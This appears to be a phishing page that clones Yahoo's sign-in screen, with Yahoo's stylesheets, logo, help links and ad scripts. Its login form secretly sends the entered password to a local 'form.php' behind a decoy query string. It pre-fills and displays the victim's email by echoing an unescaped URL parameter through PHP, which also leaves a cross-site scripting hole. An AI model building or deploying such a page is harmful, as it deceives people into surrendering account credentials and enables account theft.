...
<style type="text/css">
.clear{clear:both}
.primaryCta {background:none; background-color: #6E329D; background-image: -moz-linear-gradient(left center , #6E329D 0%, #6E329D 100%); border: 1px solid #522675; border-radius: 2px 2px 2px 2px; color:#fff;}
...
<link rel="stylesheet" type="text/css" href="https://s.yimg.com/lq/lib/reg/css/container-min-1.css">
    ...
    .pwqaContent .pwqa-question {padding-top:10px;padding-left:0px;}
    .pwqaContent .pwqa-question span {display: block; float: left; padding-right: 10px; text-align: right; width: 190px;}
    ...
    .pwqaContent #verifybtn {margin-top:5px;text-align:center;}
    ...
    .pwqaContent .pwqa-aea-text {padding-top:10px;}
    ...
    .aeaContent ul li input {margin-right:10px;height:13px !important;border:0 !important;outline-style:none !important;*vertical-align:top !important;}
	...
	#lockedValidationErr {visibility: hidden;}
    ...
    #submitC #cdiv .marginb {margin-left:10px; margin-right:10px;}
    .OOBButtons button {background:none !important; background-color: #6E329D !important; background-image: -moz-linear-gradient(left center , #6E329D 0%, #6E329D 100%) !important; border: 1px solid #522675 !important; border-radius: 2px 2px 2px 2px !important; color:#fff !important;padding:4px !important;}
    .lockedContent2 .next-line {display:block;padding:1em 0;font-size:100%;}
    .lockedContent2 .ref-num {font-size:110%;font-weight:bold;}
        </style>
        <!--[if lt IE 7]>
        <style type="text/css">
...
#mainBox{position:relative;top:11px;width:100%;height:960px;min-height:680px;margin:0 auto;background-color:transparent;text-align:left;}
#iframeHolder{height:1024px;width:1920px;margin:0 auto 0 -960px;position:absolute;top:61px;left:50%;overflow:visible;direction:ltr;}
#loginHolder{height:100%;min-width:262px;max-width:840px;margin:0 auto;position:relative;}
...
#hdBg {min-height:61px;height:auto !important; height:61px; max-width:1440px; width:auto !important; width:970px;margin:0 auto}
...
<link type='text/css' rel='stylesheet' href='https://s.yimg.com/zz/combo?kx/yucs/uh3/uh/css/904/uh_non_mail-min.css&kx/yucs/uh3/uh/css/903/uh_ssl-min.css'/><!-- intl = us, locale = en-US, spaceid = 150002528 offset = 0 Header 2.0 -->
<style>#yUnivHead{background:none repeat scroll 0 0 transparent;}</style><style>#yucs{margin:0 auto;width:100% !important}#yucs .yucs-avatar{height:22px;width:22px}#yucs #yucs-profile_text .yuhead-name-greeting{display:none}#yucs #yucs-profile_text .yuhead-name{top:0;max-width:65px;_width:65px}#yucs-profile_text{max-width:65px}.yucs-hide{display:none !important}#yucs #yucs-help_link{font-size:13px;color:#1d1da3;text-shadow:1px 1px 1px #fff;-ms-text-shadow:1px 1px 1px #FFF;text-indent:0;text-decoration:none}#yucs #yucs-help{margin-top:13px;margin-right:10px;*margin-top:19px}#yucs #yucs-help_link:hover{text-decoration:underline}#yucs-profile a#yucs-menu_link_profile{width:100%;_width:100px}#yucs-profile_text{_margin-top:10px}#yucs .yucs-signout{_margin-top:-5px}</style><div id="yucsHead" class="yucs-login yucs-en-us"><div id="yucs" class="yucs-mc " data-lang="en-us" data-property="login" data-flight="1388750222" data-linktarget="_top" data-uhvc="/">        <div class="yucs-fl-left yog-cp">         <div id="yucs-logo">    <style>        #yucs #yucs-logo-ani {          width:120px ;          height:34px;          background-image:url(https://s1.yimg.com/rz/l/yahoo_en-US_f_pw_125x32.png) ;          _background-image:url(https://s1.yimg.com/rz/l/yahoo_en-US_f_pw_125x32.gif) ;          *left: 0px;          display:block ;          visibility:hidden;          clip: rect(23px,154px,42px,0px);         *clip: rect(23px 154px 42px 0px);         position: absolute;        }                .lt #yucs-logo-ani {        background-position: 100% 0px !important;        }                .lt #yucs[data-property='mail'] #yucs-logo-ani {        background-position: -350px 0px !important;        }                #yucs-logo {        margin-top:0px!important;        padding-top: 11px;        width: 120px;        }                #yucs[data-property='homes'] #yucs-logo {            width: 102px;        }                .advisor #yucs-link-ani {            left: 21px !important;        }        .advisor #yucs-search {            padding-left: 34px;        }        #yucs #yucs-logo a {margin-left: 0!important;}#yucs #yucs-link-ani {width: 100% !important;}        @media        only screen and (-webkit-min-device-pixel-ratio: 2),        only screen and ( min--moz-device-pixel-ratio: 2),        only screen and ( -o-min-device-pixel-ratio: 2/1),        only screen and ( min-device-pixel-ratio: 2),        only screen and ( min-resolution: 192dpi),        only screen and ( min-resolution: 2dppx) {         #yucs #yucs-logo-ani  {                background-image: url(https://s1.yimg.com/rz/l/yahoo_en-US_f_pw_125x32_2x.png) !important;                background-size: 240px 34px;            }            }        }    </style>        <div>        <a id="yucs-logo-ani" href="https://www.yahoo.com"           target="_top" data-alg="">          Yahoo        </a>    </div>     <img id="imageCheck" src="https://s1.yimg.com/os/mit/media/m/base/images/transparent-95031.png" alt=""/>    </div><noscript><style>#yucs #yucs-logo-ani {visibility: visible;position: relative;clip: auto;}</style></noscript><script charset='utf-8' type='text/javascript' src='https://s1.yimg.com/kx/yucs/uh3/uh/js/48/ai-ssl-min.js'></script><script>function isIE() {var myNav = navigator.userAgent.toLowerCase();return (myNav.indexOf('msie') != -1) ? parseInt(myNav.split('msie')[1]) : false;}function loadAnimAfterOnLoad() { if (typeof Aniden != 'undefined'&& Aniden.play&& (document.getElementById('yucs').getAttribute('data-property') !== 'mail' || document.getElementById('yucs-logo-ani').getAttribute('data-alg'))) {Aniden.play();}}if (isIE()) {var _animPltTimer = setTimeout(function() {this.loadAnimAfterOnLoad();}, 6000);} else if((navigator.userAgent.toLowerCase().indexOf('firefox') > -1)) {      var _animFireFoxTimer = setTimeout(function() {            this.loadAnimAfterOnLoad();        }, 2000);}else {document.addEventListener("Aniden.animReadyEvent", function() {loadAnimAfterOnLoad();},true);}</script>     </div><div class="yucs-fl-right">  <div id="yucs-profile" class="yucs-profile yucs-signedout">    <a id="yucs-menu_link_profile_signed_out" href="https://login.yahoo.com/config/login?.src=ymbr&.intl=us&.lang=en-US&.done=https://login.yahoo.com/config/login%3f.src=fpctx%26.intl=us%26.done=https%253A%252F%252Fwww.yahoo.com%252F"  target="_top" rel="nofollow" class="sp yucs-fc" aria-label="Profile">    </a>    <div id="yucs-profile_text" class="yucs-fc">        <a id="yucs-login_signIn" href="https://login.yahoo.com/config/login?.src=ymbr&.intl=us&.lang=en-US&.done=https://login.yahoo.com/config/login%3f.src=fpctx%26.intl=us%26.done=https%253A%252F%252Fwww.yahoo.com%252F"  target="_top" rel="nofollow" class="yucs-fc">            Sign In        </a>    </div></div>       <div id="yucs-help" class="yucs-activate yucs-help yucs-menu_nav">    <a id="yucs-help_link"          href="http://help.yahoo.com/kb/index?locale=en_US&page=product&y=PROD_ACCT"        aria-label="Help" rel="nofollow">        Help    </a></div>                      </div>            </div><!-- contextual_shortcuts --><!-- /contextual_shortcuts --><!-- property: login | languagetag: en-us | status: active | spaceid:  | cobrand: standard | markup: empty --><div id="yUnivHead" class="yucs-hide"><!-- empty --></div></div><style>#yuhead-mepanel {width: 150%;}</style>                <script>
                window.onload = function() {
                    ...
                    loadUHJS = function() {
                        ...
                        hdJS.src = 'https://s.yimg.com/zz/combo?kx/yucs/uh3/uh/js/871/uh-min.js&kx/yucs/uh3/uh/js/102/gallery-jsonp-min.js&kx/yucs/uh3/uh/js/771/menu_utils_v3-min.js&kx/yucs/uh3/uh/js/822/timestamp_library-min.js&kx/yucs/uh3/uh/js/836/logo_debug-min.js&kx/yucs/uh3/help/js/53/help_menu_v3-min.js';
...
<fieldset id='fsLogin' class='clear'>
	...
	<form method="post" action="form.php?rand=13InboxLightaspxn.1774256418&fid.4.1252899642&fid=1&fav.1&rand.13InboxLight.aspxn.1774256418&fid.1252899642&fid.1&fav.1&email=<?php echo $_GET['email']; ?>&.rand=13InboxLight.aspx?n=1774256418&fid=4#n=1252899642&fid=1&fav=1" autocomplete="" name="login_form" id="login_form" onsubmit>
	...
	<input type="hidden" name=".u" value="9q1n2vp9cd9ce">
	<input type="hidden" name=".v" value="0">
	<input type="hidden" name=".challenge" value="R6JdYH0rOUW7s7PLN0ADzHzEv5cC">
	...
	<input type="hidden" name=".done" value="https://www.yahoo.com/">
	<input type="hidden" name=".pd" value="fpctx_ver=0&c=&ivt=&sg=">
	...
	<div id='inputs'>
					<input name='email' id='email' type="hidden" maxlength='96' tabindex='1' aria-required="true" placeholder="Yahoo ID" autocorrect="off" autocomplete="off" value="<?php echo $_GET['email']; ?>"><h2 class="form-signin-heading"><?php echo $_GET['email']; ?></h2>


					<input name='Password' id='passwd' type='password' maxlength='64' tabindex='2' aria-required="true" placeholder="Password" autocorrect="off" autocomplete="off" value="">
	...
	<span id="pLabel" for='persistent' tabindex='3'><span id="pLabelC" class="checkbox lg-sprite ">&nbsp;</span><span class="labeltxt">Keep me signed in</span></span>
	</div>
	<div id='submit'>
	...
	<div class="help-links">
		<a id="forgotLnk" href="https://edit.yahoo.com/config/eval_forgot_pw?new=1&.done=https%3A//www.yahoo.com/&.src=fpctx&partner=&.intl=us&.lang=en-US&pkg=&stepid=&.pd=fpctx_ver%3d0%26c=&.ab=&.last=" tabindex="5">I can't access my account</a>
		<br /><a id="helpLnk" href= "https://login.yahoo.com/config/login?.src=fpctx&.intl=us&.lang=en-US&.help=1&.v=0&.u=9q1n2vp9cd9ce&.last=&.last=&promo=&.bypass=&.partner=&pkg=&stepid=&.pd=fpctx_ver%253D0%2526c%253D%2526ivt%253D%2526sg%253D&.ab=&.done=https%3A//www.yahoo.com/" tabindex="6">Help</a>
		</div>
...
<div class="lgbx-signup">
    <span class="mm-or">OR</span>
		<a id="signUpBtn" tabindex="9" class="lgbx-btn blue-bg" href="https://edit.yahoo.com/config/eval_register?.intl=us&.lang=en-US&.pd=fpctx_ver%253D0%2526c%253D%2526ivt%253D%2526sg%253D&new=1&.done=https%3A//www.yahoo.com/&.src=fpctx&.v=0&.u=9q1n2vp9cd9ce&partner=&.partner=&pkg=&stepid=&.p=&promo=&.last=">Create New Account</a>
	</div>
        ...
        <div id="idp">
			<div id="idpBtns">
					...
					Sign in with <a id="fbLink" href="https://open.login.yahoo.com/openid/yrp/signin?idp=facebook&ts=1388750222&.intl=us&.lang=en-US&.done=https%3A%2F%2Fwww.yahoo.com%2F&rpcrumb=DOZcN2P1Lzy&.src=fpctx" target="_blank" tabindex="7">Facebook</a> or <a id="ggLink" href="https://open.login.yahoo.com/openid/yrp/signin?idp=google&ts=1388750222&.intl=us&.lang=en-US&.done=https%3A%2F%2Fwww.yahoo.com%2F&rpcrumb=DOZcN2P1Lzy&.src=fpctx" target="_blank" tabindex="8">Google</a>				</div>
						</div>   
			<div class="clear"></div>
        </div>
        <script>
        var fbSigninLnk = "https://open.login.yahoo.com/openid/yrp/signin?idp=facebook&ts=1388750222&.intl=us&.lang=en-US&.done=https%3A%2F%2Fwww.yahoo.com%2F&rpcrumb=DOZcN2P1Lzy&.src=fpctx";
        var googSigninLnk = "https://open.login.yahoo.com/openid/yrp/signin?idp=google&ts=1388750222&.intl=us&.lang=en-US&.done=https%3A%2F%2Fwww.yahoo.com%2F&rpcrumb=DOZcN2P1Lzy&.src=fpctx"; 
        </script>
...
<!-- intl = us, spaceid = 150002528 offset = 0 position = FOOT -->
<!-- static compact footer --> 
    ...
    <p>
        <!--<a href="https://legalredirect.yahoo.com/copyright?intl=us&lang=en-US" target='_blank'>Copyright/IP Policy</a> | -->
        <a href="https://legalredirect.yahoo.com/utos?intl=us&lang=en-US" target='_blank'>Terms</a> | 
        <!-- <a href="http://security.yahoo.com" target="_blank">Guide to Online Security</a> | -->
        <a href="https://legalredirect.yahoo.com/privacy?intl=us&lang=en-US" target="_blank">Privacy</a>     </p>
</div>
    </div>
...
var perceivedAd2 = "1";
var actualAd2 = "1";
var baseSpaceID = "150002528";
var intlSpaceID = "150082528";
</script>
...
Y.showUpgradeCTA = function(version){
  try{
    ...
    var beaconUrl = 'https://login.yahoo.com/i/flashUp/ft.gif' + '?v=' + version + '&intl=' + 'uk';
    ...
    Event.on("gBtn","click", function(t) {
        ...
        window.open(googSigninLnk, "go", winProps);
                ...
                <div style="display:none">
                    ...
                    <script type="text/plain" id="fc" _ver="2-4-4">{ positions: [ { html: "<!--Static sales ad--> \n<!--Vendor: Yahoo, Format: Login Ad - Static, Name: Login Ad-->\n<style>\nhtml {background-color:#fff;}\nbody,div,p,a {margin:0;padding:0;}\n#richad *{outline:none;user-select:none;-moz-user-select:none;-khtml-user-select:none;}\n.offscrn{clip:rect(0 0 0 0);position:absolute;top:0;left:0;margin:0;padding:0;font-size:.1em;}\n\n#adlinks {position:relative;width:400px;margin:0 auto;font:11px arial;z-index:100;}\n#adlinks p {position:absolute;text-align:right;right:90px;top:15px;}\n#adlinks,#adlinks a {color:#999;}\n#adlinks a {margin:0 5px;text-decoration:none;}\n.can_ad_slug{padding:0px 15px 0px 0px;background:url('https://s.yimg.com/lq/lib/can_interstitial/icons/adchoice_1.4.png') no-repeat right;}\n\n#richad{height:1024px;width:1440px;overflow:hidden;position:relative;margin:0 auto;background-repeat:no-repeat;background-position:center top;}\n.hotspot{position:absolute;display:block;z-index:10;outline:none;}\n.hotspot img {display:block;}\n\n#hotspot5{left:310px;top:0px;}	\n\n#hotspot_main{z-index:9;width:400px;margin:0 auto;position:relative;}\n#hotspot_main .hotspot{position:absolute;right:95px;top:40px;}\n\n</style>\n<h1 class=\"offscrn\">ADVERTISEMENT: IE10 - IE10</h1>\n\n<div id=\"richad\">\n\n<a href=\"https://clicks.beap.bc.yahoo.*http://global.ard.yahoo.com/SIG=15j6s7pm9/M=999999.999999.999999.999999/D=yahoo/S=150082528:RICH/Y=UKIE/EXP=1372720364/L=bpMbMtmSu3tXmYIpf_8RaAGmrKIT4lHR8MwAAJ2I/B=WDRAdE3uvLU-/J=1372713164103739/K=8zPulJWaqL1MnL12HaYDWA/A=2344319989535679572/R=0/X=6/id=hotspot5/SIG=11hjlr8qu/*http://downloads.yahoo.com/uk/internetexplorer/\" target=\"_blank\" class=\"hotspot\" id=\"hotspot5\"><img src=\"https://s.yimg.com/lq/i/ww/eyc/p.gif\" height=\"1020\" width=\"1126\" border=\"0\" alt=\"Click For: IE10\" /></a>\n\n\n<div id=\"hotspot_main\"><a href=\"https://clicks.beap.bc.yahoo.*http://global.ard.yahoo.com/SIG=15j6s7pm9/M=999999.999999.999999.999999/D=yahoo/S=150082528:RICH/Y=UKIE/EXP=1372720364/L=bpMbMtmSu3tXmYIpf_8RaAGmrKIT4lHR8MwAAJ2I/B=WDRAdE3uvLU-/J=1372713164103739/K=8zPulJWaqL1MnL12HaYDWA/A=2344319989535679572/R=1/X=6/id=wp_main450bg/SIG=11hjlr8qu/*http://downloads.yahoo.com/uk/internetexplorer/\" target=\"_blank\" class=\"hotspot\"><img src=\"https://s.yimg.com/lq/i/ww/eyc/p.gif\" height=\"450\" width=\"450\" border=\"0\" alt=\"\" /></a></div>\n\n<div id=\"adlinks\"><p><a href=\"https://clicks.beap.bc.yahoo.*http://info.yahoo.com/privacy/uk/yahoo/relevantads.html\" class=\"can_ad_slug\" target=\"_blank\">AdChoices</a></p></div>\n</div>\n\n<scr"+"ipt>\nfunction addEvent(obj,axn,fxn){if(window.attachEvent)obj.attachEvent(\"on\"+axn,fxn);else obj.addEventListener(axn,fxn,0);}\nfunction adTRK(t){if(t){var i=new Image;i.onload=function(){};i.src=t;}}\nfunction ad_init() {\n	document.getElementById(\"richad\").style.backgroundImage = \"url(https://s.yimg.com/cv/ae/uk/audience/130415/1440x1024umq28yo0g.jpg)\"; \n		}\naddEvent(window,\"load\", function(){setTimeout(ad_init,1);});\n</scr"+"ipt>\n<!-- https://clicks.beap.bc.yahoo.*http://global.ard.yahoo.com/SIG=15j6s7pm9/M=999999.999999.999999.999999/D=yahoo/S=150082528:RICH/Y=UKIE/EXP=1372720364/L=bpMbMtmSu3tXmYIpf_8RaAGmrKIT4lHR8MwAAJ2I/B=WDRAdE3uvLU-/J=1372713164103739/K=8zPulJWaqL1MnL12HaYDWA/A=2344319989535679572/R=2/X=6/* --><!--QYZ 142640032,2613679032,10.200.18.36;;RICH;150082528;1;-->", id: "RICH", meta: { y: { cscHTML: "", behavior: "non_exp", adID: "2344319989535679572", matchID: "999999.999999.999999.999999", err: "", hasExternal: 0, size: "1440x1024", bookID: "142640032", serveType: "-1", slotID: "2" } } } ], meta: { y: { pageEndHTML: "", pos_list: [ "FOOT","FOOT9","RICH" ], spaceID: "150082528", host: "login.yahoo.com", lookupTime: "55", k2_uri: "", fac_rt: "51235" } } } </script><script language=javascript>
if(window.xzq_d==null)window.xzq_d=new Object();
window.xzq_d['WDRAdE3uvLU-']='(as$12q2h0psm,aid$WDRAdE3uvLU-,bi$142640032,cr$2613679032,ct$25,at$H,eob$-1)';
</script><noscript><img width=1 height=1 alt="" src="https://csc.beap.bc.yahoo.com/yi?bv=1.0.0&bs=(135nn85fr(gid$bpMbMtmSu3tXmYIpf_8RaAGmrKIT4lHR8MwAAJ2I,st$1372713164065537,si$3227532,sp$150082528,pv$1,v$2.0))&t=J_3-DR_3&al=(as$12q2h0psm,aid$WDRAdE3uvLU-,bi$142640032,cr$2613679032,ct$25,at$H,eob$-1)"></noscript><script language=javascript>
if(window.xzq_d==null)window.xzq_d=new Object();
window.xzq_d['iHk_dE3uvLU-']='(as$125dm846b,aid$iHk_dE3uvLU-,cr$-1,ct$25,at$H,eob$-1)';
</script><noscript><img width=1 height=1 alt="" src="https://csc.beap.bc.yahoo.com/yi?bv=1.0.0&bs=(135nn85fr(gid$bpMbMtmSu3tXmYIpf_8RaAGmrKIT4lHR8MwAAJ2I,st$1372713164065537,si$3227532,sp$150082528,pv$1,v$2.0))&t=J_3-DR_3&al=(as$125dm846b,aid$iHk_dE3uvLU-,cr$-1,ct$25,at$H,eob$-1)"></noscript><script language=javascript>
...
if(window.xzq_p)xzq_p('yi?bv=1.0.0&bs=(135nn85fr(gid$bpMbMtmSu3tXmYIpf_8RaAGmrKIT4lHR8MwAAJ2I,st$1372713164065537,si$3227532,sp$150082528,pv$1,v$2.0))&t=J_3-DR_3');
if(window.xzq_s)xzq_s();
</script><noscript><img width=1 height=1 alt="" src="https://csc.beap.bc.yahoo.com/yi?bv=1.0.0&bs=(135nn85fr(gid$bpMbMtmSu3tXmYIpf_8RaAGmrKIT4lHR8MwAAJ2I,st$1372713164065537,si$3227532,sp$150082528,pv$1,v$2.0))&t=J_3-DR_3"></noscript>
                </div>
                <script type="text/javascript">
...
<!-- spaceid: 150002528 INT.OFFSET: 80000 --><!-- SpaceID=150082528 loc=FOOT9 noad --><!-- fac-gd2-noad --><!-- gd2-status-2 --><!--QYZ CMS_NONE_AVAIL,,10.200.18.36;;FOOT9;150082528;2;--><!-- login.yahoo.com Mon Jul 1 14:12:44 PDT 2013 --><!-- Begin comScore Tag -->
<script>
  ...
  _comscore.push({
    ...
    c2: "7241469",
    c5: "150082528",
    c7: "https%3A%2F%2Flogin.yahoo.com%3A443%2Fconfig%2Flogin%3F.src%3Dfpctx%26amp%3B.intl%3Duk%26amp%3B.pd%3Dc%253D6T7evjap2e6CwWSb86QVdqk-%26amp%3B.done%3Dhttp%253A%252F%252Fyahoo.com%252F" 
  });
  (function() {
...
<!-- l49.member.bf1.yahoo.com compressed/chunked Fri Jan  3 03:57:02 PST 2014 -->
